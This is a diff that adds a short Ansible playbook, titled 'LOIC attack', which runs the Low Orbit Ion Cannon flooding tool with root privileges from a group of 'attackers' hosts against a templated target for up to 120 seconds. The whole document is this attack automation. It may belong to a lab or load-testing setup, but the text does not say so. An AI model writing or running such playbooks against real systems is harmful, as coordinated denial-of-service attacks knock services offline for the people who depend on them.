@@ -1,0 +1,10 @@
+---
+- name: LOIC attack
+  hosts: attackers
+  gather_facts: false
+  become: true
+
+  tasks:
+    - name: Run LOIC (Low Orbit Ion Cannon)
+      shell: "timeout {{ [duration | int, 120] | min }}s /opt/loic/loic {{ target }}"
+      ignore_errors: true
